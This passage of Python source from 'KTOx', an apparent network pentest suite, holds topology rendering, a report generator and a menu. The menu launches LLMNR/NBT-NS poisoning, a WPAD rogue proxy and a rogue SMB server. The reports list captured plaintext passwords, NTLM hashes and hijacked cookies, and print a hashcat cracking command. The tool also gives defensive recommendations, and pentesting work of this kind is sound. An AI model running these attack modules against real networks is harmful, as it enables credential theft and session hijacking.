            vendor   = host.get("vendor") or self._resolve_vendor(mac)
            hostname = host.get("hostname", "—")
            is_gw    = ip == self.gateway_ip
            if is_gw: continue

            icon     = self._get_icon(vendor, is_gw)
            req_cnt  = traffic.get(ip, 0)
            has_cred = ip in cred_srcs

            # Build label
            cred_tag = f"  [{C_EMBER}]⚡ CREDS[/{C_EMBER}]" if has_cred else ""
            traffic_tag = (
                f"  [{C_DIM}]{req_cnt} reqs[/{C_DIM}]"
                if req_cnt > 0 else ""
            )

            node = gw_node.add(
                f"{icon} [{C_WHITE}]{ip}[/{C_WHITE}]  "
                f"[{C_STEEL}]{mac}[/{C_STEEL}]  "
                f"[{C_DIM}]{vendor}[/{C_DIM}]  "
                f"[{C_ASH}]{hostname}[/{C_ASH}]"
                f"{cred_tag}{traffic_tag}"
            )

            # DNS queries from this host
            host_dns = [
                q for q in self.dns_queries
                if (q.get("data") or {}).get("src", "") == ip
            ]
            if host_dns:
                dns_node = node.add(f"[{C_DIM}]DNS queries[/{C_DIM}]")
                for q in host_dns[:5]:
                    qname   = (q.get("data") or {}).get("query", "?")
                    spoofed = (q.get("data") or {}).get("spoofed")
                    if spoofed:
                        dns_node.add(
                            f"[{C_EMBER}]↪ {qname} → {spoofed}[/{C_EMBER}]"
                        )
                    else:
                        dns_node.add(f"[{C_DIM}]{qname}[/{C_DIM}]")

        console.print(root)

    def render_table(self):
        """Render a detailed host table."""
        table = Table(
            box=box.SIMPLE_HEAD,
            border_style=C_RUST,
            header_style=f"bold {C_BLOOD}",
            padding=(0, 1)
        )
        table.add_column("IP",       style=C_WHITE,  no_wrap=True)
        table.add_column("MAC",      style=C_STEEL,  no_wrap=True)
        table.add_column("VENDOR",   style=C_DIM,    no_wrap=True)
        table.add_column("HOST",     style=C_ASH,    no_wrap=True)
        table.add_column("REQS",     style=C_DIM,    no_wrap=True)
        table.add_column("CREDS",    style=C_EMBER,  no_wrap=True)
        table.add_column("TYPE",     style=C_YELLOW, no_wrap=True)

        traffic  = {}
        for req in self.http_requests:
            src = (req.get("data") or {}).get("src", "")
            traffic[src] = traffic.get(src, 0) + 1

        cred_srcs = {}
        for cred in self.credentials:
            src = (cred.get("data") or {}).get("src", "")
            if src: cred_srcs[src] = cred_srcs.get(src, 0) + 1

        for host in self.hosts:
            ip       = host.get("ip", "?")
            mac      = host.get("mac", "?")
            vendor   = host.get("vendor") or self._resolve_vendor(mac)
            hostname = host.get("hostname", "—")
            is_gw    = ip == self.gateway_ip
            req_cnt  = str(traffic.get(ip, 0)) if traffic.get(ip, 0) else "—"
            cred_cnt = str(cred_srcs.get(ip, 0)) if cred_srcs.get(ip, 0) else "—"
            role     = f"[{C_YELLOW}]GATEWAY[/{C_YELLOW}]" if is_gw else "HOST"
            icon     = self._get_icon(vendor, is_gw)

            table.add_row(
                ip, mac,
                f"{icon} {vendor[:14]}",
                hostname[:18],
                req_cnt, cred_cnt, role
            )

        console.print(table)

    def export_json(self):
        """Export topology as JSON."""
        os.makedirs(loot_dir, exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(loot_dir, f"topology_{ts}.json")
        data = {
            "generated":   datetime.now().isoformat(),
            "gateway_ip":  self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "hosts":       self.hosts,
            "dns_queries": len(self.dns_queries),
            "http_reqs":   len(self.http_requests),
            "credentials": len(self.credentials),
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        console.print(f"  [{C_GOOD}]✔ Topology JSON → {path}[/{C_GOOD}]")
        return path

    def export_html(self):
        """Export an interactive HTML topology map."""
        os.makedirs(loot_dir, exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(loot_dir, f"topology_{ts}.html")

        traffic = {}
        for req in self.http_requests:
            src = (req.get("data") or {}).get("src", "")
            traffic[src] = traffic.get(src, 0) + 1

        cred_srcs = set()
        for cred in self.credentials:
            src = (cred.get("data") or {}).get("src", "")
            if src: cred_srcs.add(src)

        nodes_js = []
        edges_js = []

        # Gateway node
        nodes_js.append(
            f'{{id:"gw",label:"{self.gateway_ip}\\nGATEWAY",'
            f'color:"#C0392B",font:{{color:"#fff"}},shape:"diamond",size:30}}'
        )

        for i, host in enumerate(self.hosts):
            ip  = host.get("ip", "?")
            mac = host.get("mac", "?")
            vendor = host.get("vendor") or self._resolve_vendor(mac)
            hostname = host.get("hostname", "")
            if ip == self.gateway_ip: continue

            has_cred = ip in cred_srcs
            color    = "#E74C3C" if has_cred else "#2C3E50"
            border   = "#C0392B" if has_cred else "#566573"
            label    = f"{ip}\\n{vendor[:12]}"
            if hostname and hostname != "—":
                label += f"\\n{hostname[:16]}"

            nodes_js.append(
                f'{{id:"{ip}",label:"{label}",'
                f'color:{{background:"{color}",border:"{border}"}},'
                f'font:{{color:"#eee"}},size:20}}'
            )
            reqs = traffic.get(ip, 0)
            width = min(1 + reqs // 10, 6)
            edges_js.append(
                f'{{from:"gw",to:"{ip}",width:{width},'
                f'color:{{color:"#7B241C"}}}}'
            )

        html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>KTOx — Network Topology</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/vis/4.21.0/vis.min.js"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/vis/4.21.0/vis.min.css" rel="stylesheet">
<style>
  body{{background:#070707;margin:0;font-family:'Courier New',monospace;color:#F0F0F0;}}
  #header{{background:#0F0F0F;border-bottom:1px solid #7B241C;padding:12px 20px;
           display:flex;align-items:center;justify-content:space-between;}}
  .brand{{color:#C0392B;font-size:1.1rem;letter-spacing:.15em;font-weight:bold;}}
  .info{{color:#566573;font-size:.75rem;}}
  #topology{{width:100%;height:calc(100vh - 120px);background:#0A0A0A;}}
  #legend{{background:#0F0F0F;border-top:1px solid #1E0806;padding:8px 20px;
           display:flex;gap:2rem;font-size:.7rem;color:#566573;}}
  .leg{{display:flex;align-items:center;gap:.4rem;}}
  .dot{{width:10px;height:10px;border-radius:50%;}}
</style>
</head>
<body>
<div id="header">
  <div class="brand">▐ KTOX ▌ — Network Topology</div>
  <div class="info">
    Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} ·
    {len(self.hosts)} hosts · GW: {self.gateway_ip}
  </div>
</div>
<div id="topology"></div>
<div id="legend">
  <div class="leg"><div class="dot" style="background:#C0392B"></div>Gateway</div>
  <div class="leg"><div class="dot" style="background:#E74C3C"></div>Credentials captured</div>
  <div class="leg"><div class="dot" style="background:#2C3E50"></div>Clean host</div>
  <div class="leg">Edge width = HTTP request volume</div>
</div>
<script>
var nodes = new vis.DataSet([{','.join(nodes_js)}]);
var edges = new vis.DataSet([{','.join(edges_js)}]);
var opts  = {{
  nodes:{{borderWidth:2,shadow:true}},
  edges:{{smooth:{{type:"curvedCW",roundness:.2}},arrows:{{to:{{enabled:true,scaleFactor:.6}}}}}},
  physics:{{stabilization:true,barnesHut:{{gravitationalConstant:-8000,springLength:180}}}},
  interaction:{{hover:true,tooltipDelay:100}},
  background:{{color:"#0A0A0A"}}
}};
new vis.Network(document.getElementById("topology"),{{nodes,edges}},opts);
</script>
</body>
</html>"""

        with open(path, "w") as f:
            f.write(html)

        console.print(f"  [{C_GOOD}]✔ Topology HTML → {path}[/{C_GOOD}]")
        return path


# ══════════════════════════════════════════════════════════════════════════════
# ── REPORT GENERATOR ─────────────────────────────────────────════════════════
# ══════════════════════════════════════════════════════════════════════════════

class ReportGenerator:
    """
    Generates a full pentest report from all KTOx session loot.
    Reads all log files in ktox_loot/ and produces:
    - Markdown report (.md)
    - HTML report (styled, printable)
    """

    def __init__(self, loot_path=None):
        self.loot_path = loot_path or loot_dir
        self._events   = []
        self._load_loot()

    def _load_loot(self):
        """Load all NDJSON log files from loot directory."""
        if not os.path.exists(self.loot_path):
            return
        for fname in sorted(os.listdir(self.loot_path)):
            if not fname.endswith(".log"): continue
            fpath = os.path.join(self.loot_path, fname)
            try:
                with open(fpath) as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                self._events.append(json.loads(line))
                            except: pass
            except: pass

    def _filter(self, *event_types):
        return [e for e in self._events if e.get("event") in event_types]

    def _count(self, *event_types):
        return len(self._filter(*event_types))

    def generate_markdown(self):
        """Generate a Markdown pentest report."""
        ts    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        fname = f"ktox_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        path  = os.path.join(self.loot_path, fname)

        creds    = self._filter(
            "CREDENTIAL","JS_CREDS","FTP_CRED","SMTP_AUTH",
            "POP3_CRED","IMAP_CRED","IRC_PASS","REDIS_AUTH",
            "HTTP_BASIC_AUTH","WPAD_NTLM","CAPTIVE_PORTAL"
        )
        hashes   = self._filter("SMB_NTLM_HASH","NTLM_HASH","WPAD_NTLM")
        sessions = self._filter("SESSION_HIJACK")
        dns      = self._filter("DNS_QUERY","DNS_SPOOF","LLMNR_POISONED","NBNS_POISONED")
        http_req = self._filter("HTTP_REQUEST")
        dhcp     = self._filter("DHCP_LEASE")
        arp_c    = self._filter("ARP_CONFLICT","ARP_DIFF_CHANGE")
        rogues   = self._filter("ROGUE_DETECTED")
        scans    = self._filter("SCAN_COMPLETE","ARP_SCAN_COMPLETE")
        injects  = self._filter("JS_INJECT")

        lines = []
        lines.append(f"# KTOx Penetration Test Report")
        lines.append(f"\n**Generated:** {ts}  ")
        lines.append(f"**Tool:** KTOx Network Penetration & Purple Team Suite  ")
        lines.append(f"**Loot directory:** `{self.loot_path}`  ")
        lines.append(f"\n---\n")

        # Executive Summary
        lines.append("## Executive Summary\n")
        lines.append("| Finding | Count |")
        lines.append("|---------|-------|")
        lines.append(f"| Credentials captured | **{len(creds)}** |")
        lines.append(f"| NTLMv2 hashes captured | **{len(hashes)}** |")
        lines.append(f"| Session cookies hijacked | **{len(sessions)}** |")
        lines.append(f"| DNS queries intercepted | **{len(dns)}** |")
        lines.append(f"| HTTP requests observed | **{len(http_req)}** |")
        lines.append(f"| JS injections performed | **{len(injects)}** |")
        lines.append(f"| DHCP leases issued | **{len(dhcp)}** |")
        lines.append(f"| ARP conflicts detected | **{len(arp_c)}** |")
        lines.append(f"| Rogue devices detected | **{len(rogues)}** |")
        lines.append("")

        # Credentials
        if creds:
            lines.append("## Captured Credentials\n")
            lines.append("| Time | Protocol | Source | Username | Password |")
            lines.append("|------|----------|--------|----------|---------|")
            for e in creds[:50]:
                d  = e.get("data", {})
                ts = e.get("ts", "")[:19]
                proto = e.get("event", "")
                src   = d.get("src", d.get("source", "?"))
                user  = d.get("username", d.get("user", "?"))
                pw    = d.get("password", d.get("pass", "?"))
                lines.append(f"| `{ts}` | {proto} | `{src}` | `{user}` | `{pw}` |")
            lines.append("")

        # NTLMv2 Hashes
        if hashes:
            lines.append("## Captured NTLMv2 Hashes\n")
            lines.append("| Time | Protocol | Domain | Username | Hash (partial) |")
            lines.append("|------|----------|--------|----------|---------------|")
            for e in hashes[:30]:
                d      = e.get("data", {})
                ts     = e.get("ts", "")[:19]
                proto  = d.get("proto", e.get("event",""))
                domain = d.get("domain","?")
                user   = d.get("username","?")
                nt     = d.get("nt_hash", d.get("hash",""))[:32] + "..."
                lines.append(
                    f"| `{ts}` | {proto} | `{domain}` | `{user}` | `{nt}` |"
                )
            lines.append("")
            lines.append(
                "> **Crack hashes:** `hashcat -m 5600 ktox_loot/ntlm_hashes.txt wordlist.txt`\n"
            )

        # Session Hijacks
        if sessions:
            lines.append("## Hijacked Sessions\n")
            lines.append("| Time | Host | Source | Cookie (partial) |")
            lines.append("|------|------|--------|----------------|")
            for e in sessions[:20]:
                d      = e.get("data", {})
                ts     = e.get("ts", "")[:19]
                host   = d.get("host","?")
                src    = d.get("src","?")
                cookie = d.get("cookie","")[:60] + "..."
                lines.append(f"| `{ts}` | `{host}` | `{src}` | `{cookie}` |")
            lines.append("")
            lines.append(
                "> **Replay sessions:** `bash ktox_loot/session_replay.sh`\n"
            )

        # DNS Poisoning
        if dns:
            poisoned = [e for e in dns
                        if e.get("event") in ("LLMNR_POISONED","NBNS_POISONED","DNS_SPOOF")]
            if poisoned:
                lines.append("## DNS / LLMNR Poisoning\n")
                lines.append("| Time | Event | Name | Redirected To |")
                lines.append("|------|-------|------|--------------|")
                for e in poisoned[:20]:
                    d    = e.get("data", {})
                    ts   = e.get("ts","")[:19]
                    evt  = e.get("event","")
                    name = d.get("name", d.get("query","?"))
                    rto  = d.get("redirected_to", d.get("spoofed","?"))
                    lines.append(f"| `{ts}` | {evt} | `{name}` | `{rto}` |")
                lines.append("")

        # Rogue Devices
        if rogues:
            lines.append("## Rogue Devices Detected\n")
            lines.append("| Time | IP | MAC | Vendor |")
            lines.append("|------|----|-----|--------|")
            for e in rogues:
                d  = e.get("data",{})
                ts = e.get("ts","")[:19]
                lines.append(
                    f"| `{ts}` | `{d.get('ip','?')}` | "
                    f"`{d.get('mac','?')}` | {d.get('vendor','?')} |"
                )
            lines.append("")

        # Recommendations
        lines.append("## Recommendations\n")
        recs = []
        if hashes or creds:
            recs.append(
                "**Enable SMB Signing** — prevents NTLM relay attacks. "
                "Set `RequireSecuritySignature = 1` in Group Policy."
            )
        if dns:
            recs.append(
                "**Disable LLMNR and NBT-NS** — via Group Policy: "
                "*Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution*"
            )
        if sessions:
            recs.append(
                "**Enforce HTTPS everywhere** — use HSTS headers and TLS 1.2+. "
                "Mark all session cookies with `Secure` and `HttpOnly` flags."
            )
        if dhcp:
            recs.append(
                "**Enable DHCP Snooping** on managed switches — "
                "only allow DHCP responses from trusted ports."
            )
        if not recs:
            recs.append("No critical findings requiring immediate remediation.")

        for rec in recs:
            lines.append(f"- {rec}\n")

        lines.append("\n---")
        lines.append(
            f"\n*Report generated by KTOx Network Penetration & Purple Team Suite — "
            f"github.com/wickednull/KTOx_Pi*"
        )

        content = "\n".join(lines)
        with open(path, "w") as f:
            f.write(content)

        console.print(f"  [{C_GOOD}]✔ Markdown report → {path}[/{C_GOOD}]")
        return path

    def generate_html(self):
        """Generate a styled HTML pentest report."""
        md_path = self.generate_markdown()

        html_path = md_path.replace(".md", ".html")

        creds  = self._filter(
            "CREDENTIAL","JS_CREDS","FTP_CRED","SMTP_AUTH",
            "POP3_CRED","IMAP_CRED","IRC_PASS","WPAD_NTLM","CAPTIVE_PORTAL"
        )
        hashes = self._filter("SMB_NTLM_HASH","NTLM_HASH")
        sessions = self._filter("SESSION_HIJACK")

        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>KTOx Pentest Report</title>
<style>
  body{{font-family:'Courier New',monospace;background:#F8F8F8;color:#1a1a1a;
       max-width:1100px;margin:0 auto;padding:2rem;}}
  .header{{background:#C0392B;color:white;padding:2rem;margin:-2rem -2rem 2rem;}}
  .header h1{{font-size:1.8rem;margin:0 0 .5rem;}}
  .header p{{margin:0;opacity:.8;font-size:.85rem;}}
  .summary{{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
             gap:1rem;margin:2rem 0;}}
  .stat{{background:#fff;border:1px solid #ddd;border-left:4px solid #C0392B;
          padding:1rem;text-align:center;}}
  .stat-num{{font-size:2rem;font-weight:bold;color:#C0392B;}}
  .stat-label{{font-size:.7rem;color:#666;letter-spacing:.1em;margin-top:.3rem;}}
  h2{{color:#C0392B;border-bottom:2px solid #C0392B;padding-bottom:.3rem;
      margin:2rem 0 1rem;font-size:1.1rem;letter-spacing:.1em;}}
  table{{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.8rem;}}
  th{{background:#7B241C;color:white;padding:.5rem;text-align:left;}}
  td{{padding:.4rem .5rem;border-bottom:1px solid #eee;}}
  tr:hover td{{background:#fafafa;}}
  code{{background:#f0f0f0;padding:.1rem .3rem;border-radius:2px;font-size:.8rem;}}
  .cred{{color:#C0392B;font-weight:bold;}}
  .rec{{background:#fff;border-left:4px solid #1E8449;padding:.8rem 1rem;
         margin:.5rem 0;font-size:.85rem;}}
  .footer{{margin-top:3rem;padding-top:1rem;border-top:1px solid #ddd;
            color:#aaa;font-size:.75rem;text-align:center;}}
</style>
</head>
<body>
<div class="header">
  <h1>▐ KTOX ▌ Penetration Test Report</h1>
  <p>Generated: {ts} · KTOx Network Penetration & Purple Team Suite · github.com/wickednull/KTOx_Pi</p>
</div>

<div class="summary">
  <div class="stat"><div class="stat-num">{len(creds)}</div><div class="stat-label">CREDENTIALS</div></div>
  <div class="stat"><div class="stat-num">{len(hashes)}</div><div class="stat-label">NTLM HASHES</div></div>
  <div class="stat"><div class="stat-num">{len(sessions)}</div><div class="stat-label">SESSIONS</div></div>
  <div class="stat"><div class="stat-num">{len(self._events)}</div><div class="stat-label">TOTAL EVENTS</div></div>
</div>
"""

        if creds:
            html += "<h2>Captured Credentials</h2><table>"
            html += "<tr><th>Time</th><th>Protocol</th><th>Source</th><th>Username</th><th>Password</th></tr>"
            for e in creds[:50]:
                d    = e.get("data",{})
                ts_e = e.get("ts","")[:19]
                html += (
                    f"<tr><td><code>{ts_e}</code></td>"
                    f"<td>{e.get('event','')}</td>"
                    f"<td><code>{d.get('src',d.get('source','?'))}</code></td>"
                    f"<td><code class='cred'>{d.get('username',d.get('user','?'))}</code></td>"
                    f"<td><code class='cred'>{d.get('password',d.get('pass','?'))}</code></td></tr>"
                )
            html += "</table>"

        if hashes:
            html += "<h2>NTLMv2 Hashes</h2><table>"
            html += "<tr><th>Time</th><th>Protocol</th><th>Domain</th><th>Username</th><th>Hash</th></tr>"
            for e in hashes[:30]:
                d    = e.get("data",{})
                ts_e = e.get("ts","")[:19]
                nt   = d.get("nt_hash",d.get("hash",""))[:32]
                html += (
                    f"<tr><td><code>{ts_e}</code></td>"
                    f"<td>{d.get('proto',e.get('event',''))}</td>"
                    f"<td><code>{d.get('domain','?')}</code></td>"
                    f"<td><code class='cred'>{d.get('username','?')}</code></td>"
                    f"<td><code>{nt}...</code></td></tr>"
                )
            html += "</table>"
            html += "<p><code>hashcat -m 5600 ktox_loot/ntlm_hashes.txt wordlist.txt</code></p>"

        html += """
<h2>Recommendations</h2>
<div class="rec">Disable LLMNR and NBT-NS via Group Policy to prevent name resolution poisoning.</div>
<div class="rec">Enable SMB Signing on all domain controllers and clients to prevent relay attacks.</div>
<div class="rec">Enforce HTTPS with HSTS and mark all session cookies Secure + HttpOnly.</div>
<div class="rec">Enable DHCP Snooping on managed switches to prevent rogue DHCP servers.</div>
<div class="rec">Implement network segmentation — ARP attacks cannot cross VLAN boundaries.</div>

<div class="footer">KTOx Network Penetration & Purple Team Suite · github.com/wickednull/KTOx_Pi · For authorized testing only</div>
</body></html>"""

        with open(html_path, "w") as f:
            f.write(html)

        console.print(f"  [{C_GOOD}]✔ HTML report  → {html_path}[/{C_GOOD}]")
        return html_path

    def show_menu(self):
        """Interactive report generation menu."""
        section("REPORT GENERATOR")

        stats = [
            ("Events loaded",     len(self._events)),
            ("Credentials",       self._count("CREDENTIAL","JS_CREDS","FTP_CRED",
                                              "SMTP_AUTH","POP3_CRED","WPAD_NTLM")),
            ("NTLM hashes",       self._count("SMB_NTLM_HASH","NTLM_HASH")),
            ("Session hijacks",   self._count("SESSION_HIJACK")),
            ("DNS events",        self._count("DNS_QUERY","LLMNR_POISONED","NBNS_POISONED")),
            ("HTTP requests",     self._count("HTTP_REQUEST")),
        ]

        table = Table(box=box.SIMPLE, border_style=C_RUST,
                      show_header=False, padding=(0,1))
        table.add_column("k", style=C_STEEL, width=20)
        table.add_column("v", style=C_WHITE)
        for k, v in stats:
            color = C_EMBER if v > 0 else C_DIM
            table.add_row(k, f"[{color}]{v}[/{color}]")
        console.print(table)

        if len(self._events) == 0:
            console.print(
                f"\n  [{C_ORANGE}]No loot found in {self.loot_path}/[/{C_ORANGE}]\n"
                f"  [{C_DIM}]Run some attack modules first to generate loot.[/{C_DIM}]"
            )
            return

        fmt = Prompt.ask(
            f"  [{C_BLOOD}]Report format [{C_DIM}]md / html / both[/{C_DIM}][/{C_BLOOD}]",
            default="both"
        )

        if fmt in ("md", "both"):
            self.generate_markdown()
        if fmt in ("html", "both"):
            self.generate_html()


# ══════════════════════════════════════════════════════════════════════════════
# ── EXTENDED ENGINE MENU ─────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def extended_menu(iface, attacker_ip, gateway_ip):
    """Interactive extended module selector."""
    section("EXTENDED ENGINE")

    console.print(Panel(
        f"  {tag('Interface:',   C_BLOOD)}  [{C_WHITE}]{iface}[/{C_WHITE}]\n"
        f"  {tag('Attacker IP:', C_BLOOD)}  [{C_WHITE}]{attacker_ip}[/{C_WHITE}]\n"
        f"  {tag('Gateway:',     C_STEEL)}  [{C_ASH}]{gateway_ip}[/{C_ASH}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ KTOX EXTENDED ENGINE[/bold {C_BLOOD}]",
        padding=(1,2)
    ))

    console.print(f"""
  [{C_BLOOD}][1][/{C_BLOOD}]  [{C_ASH}]LLMNR + NBT-NS Poisoner[/{C_ASH}]
  [{C_BLOOD}][2][/{C_BLOOD}]  [{C_ASH}]WPAD Rogue Proxy[/{C_ASH}]
  [{C_BLOOD}][3][/{C_BLOOD}]  [{C_ASH}]Rogue SMB Server[/{C_ASH}]
  [{C_BLOOD}][4][/{C_BLOOD}]  [{C_ASH}]All of the above (full Windows attack stack)[/{C_ASH}]
  [{C_BLOOD}][5][/{C_BLOOD}]  [{C_ASH}]Hash Cracker[/{C_ASH}]
  [{C_BLOOD}][6][/{C_BLOOD}]  [{C_ASH}]Network Topology Map[/{C_ASH}]
  [{C_BLOOD}][7][/{C_BLOOD}]  [{C_ASH}]Generate Report[/{C_ASH}]
  [{C_BLOOD}][E][/{C_BLOOD}]  [{C_ASH}]Back[/{C_ASH}]
""")

    choice = Prompt.ask(f"  [{C_BLOOD}]select[/{C_BLOOD}]").strip()

    if choice == "1":
        analyze = Confirm.ask(
            f"  [{C_STEEL}]Analyze only (passive — don't poison)?[/{C_STEEL}]",
            default=False
        )
        p = LLMNRPoisoner(iface, attacker_ip, analyze_only=analyze)
        p.start()
        console.print(f"  [{C_DIM}]Running — Ctrl+C to stop[/{C_DIM}]")
        try:
            while not stop_flag.is_set(): time.sleep(1)
        except KeyboardInterrupt:
            stop_flag.set()

    elif choice == "2":
        p = WPADPoisoner(attacker_ip)
        p.start()
        console.print(f"  [{C_DIM}]WPAD server running — Ctrl+C to stop[/{C_DIM}]")
        try:
            while not stop_flag.is_set(): time.sleep(1)
        except KeyboardInterrupt:
            stop_flag.set()

    elif choice == "3":
        s = RogueSMBServer(attacker_ip)
        s.start()
        console.print(f"  [{C_DIM}]SMB server running — Ctrl+C to stop[/{C_DIM}]")
        try:
            while not stop_flag.is_set(): time.sleep(1)
        except KeyboardInterrupt:
            stop_flag.set()

    elif choice == "4":
        # Full Windows attack stack
        section("FULL WINDOWS ATTACK STACK")
        threads = []
        llmnr = LLMNRPoisoner(iface, attacker_ip)
        threads.append(llmnr.start())
        wpad = WPADPoisoner(attacker_ip, port=8888)
        threads.append(wpad.start())
        smb = RogueSMBServer(attacker_ip)
        threads.append(smb.start())

        console.print(Panel(
            f"  {tag('LLMNR Poisoner:', C_GOOD)}  ACTIVE — UDP/5355\n"
            f"  {tag('NBT-NS Poisoner:', C_GOOD)} ACTIVE — UDP/137\n"
            f"  {tag('WPAD Server:',    C_GOOD)}  ACTIVE — port 8888\n"
            f"  {tag('Rogue SMB:',      C_GOOD)}  ACTIVE — TCP/445\n\n"
            f"  [{C_DIM}]Waiting for Windows hosts to broadcast name queries...\n"
            f"  Ctrl+C to stop[/{C_DIM}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ WINDOWS ATTACK STACK ACTIVE[/bold {C_BLOOD}]",
            padding=(1,2)
        ))
        try:
            while not stop_flag.is_set(): time.sleep(1)
        except KeyboardInterrupt:
            stop_flag.set()
            console.print(f"\n  [{C_ORANGE}]Stack stopped.[/{C_ORANGE}]")

    elif choice == "5":
        cracker = HashCracker()
        cracker.show_hash_menu()

    elif choice == "6":
        # Load scan data from loot
        hosts = []
        try:
            for fname in os.listdir(loot_dir):
                if fname.startswith("baseline_") and fname.endswith(".json"):
                    with open(os.path.join(loot_dir, fname)) as f:
                        data = json.load(f)
                        hosts = data.get("hosts", [])
                    break
        except: pass

        if not hosts:
            console.print(
                f"  [{C_ORANGE}]No baseline found. Run Network Baseline Export first.[/{C_ORANGE}]"
            )
            return

        # Load events for enrichment
        events = []
        try:
            for fname in os.listdir(loot_dir):
                if fname.endswith(".log"):
                    with open(os.path.join(loot_dir, fname)) as f:
                        for line in f:
                            try: events.append(json.loads(line.strip()))
                            except: pass
        except: pass

        dns_q  = [e for e in events if e.get("event") == "DNS_QUERY"]
        http_r = [e for e in events if e.get("event") == "HTTP_REQUEST"]
        creds  = [e for e in events if "CRED" in e.get("event","") or
                  e.get("event") in ("NTLM_HASH","SMB_NTLM_HASH")]

        mapper = TopologyMapper(
            hosts=hosts,
            gateway_ip=gateway_ip,
            gateway_mac="",
            dns_queries=dns_q,
            http_requests=http_r,
            credentials=creds
        )
        mapper.render_tree()
        mapper.render_table()

        export = Prompt.ask(
            f"  [{C_STEEL}]Export? [{C_DIM}]json / html / both / no[/{C_DIM}][/{C_STEEL}]",
            default="html"
        )
        if export in ("json","both"):
            mapper.export_json()
        if export in ("html","both"):
            path = mapper.export_html()
            console.print(
                f"  [{C_DIM}]Open in browser: firefox {path}[/{C_DIM}]"
            )

    elif choice == "7":
        rg = ReportGenerator()
        rg.show_menu()

    elif choice.upper() == "E":
        return

    else:
        console.print(f"  [{C_ORANGE}]Invalid option.[/{C_ORANGE}]")


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ERROR: Must run as root"); sys.exit(1)
    iface       = Prompt.ask("Interface", default="wlan0")
    attacker_ip = Prompt.ask("Attacker IP")
    gateway_ip  = Prompt.ask("Gateway IP", default="")
    extended_menu(iface, attacker_ip, gateway_ip)
